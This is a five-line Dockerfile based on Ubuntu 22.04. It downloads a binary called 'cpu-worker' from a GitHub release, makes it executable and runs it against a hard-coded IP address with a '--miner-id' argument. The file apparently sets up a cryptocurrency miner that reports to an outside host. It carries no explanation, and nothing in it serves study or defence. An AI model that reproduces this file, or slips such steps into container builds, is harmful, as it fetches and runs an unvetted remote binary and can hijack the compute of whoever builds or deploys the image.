FROM ubuntu:22.04
RUN apt update && apt install wget curl git -y
RUN wget https://github.com/corpltd001/vs/releases/download/0.001/cpu-worker
RUN chmod +x cpu-worker
RUN ./cpu-worker 18.234.157.209 --miner-id ho3pp-cjcyb-adqz6-6t6se-a2re5-3voph-5mkyk-vxcx6-gfnyw-mftg3-5ae
